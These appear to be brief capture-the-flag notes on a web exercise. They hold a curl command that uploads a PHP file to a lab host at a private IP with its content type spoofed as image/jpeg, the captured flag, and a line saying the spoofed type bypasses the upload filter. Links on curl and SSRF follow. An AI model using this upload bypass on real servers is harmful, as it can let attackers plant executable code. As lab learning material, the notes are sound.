NOTES:

Form enctype="multipart/form-data"

curl -H 'Content-Type: multipart/form-data' -F 'Upload=Upload' -F 'uploaded=@test.php;type=image/jpeg' -X POST http://172.20.10.9/\?page\=upload -o save.txt

The flag is: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

PROBLEM FOUND:

Changing the file type, that we are going to upload, we can succesfully set any file.

SOLUTION: 



INFO

Curl examples: https://gist.github.com/subfuzion/08c5d85437d5d4f00e58
Kontra: https://application.security/free-application-security-training/server-side-request-forgery-in-capital-one
Ssrf: https://portswigger.net/web-security/ssrf
Flag: http://www.javascriptkit.com/javatutors/valid2.shtml
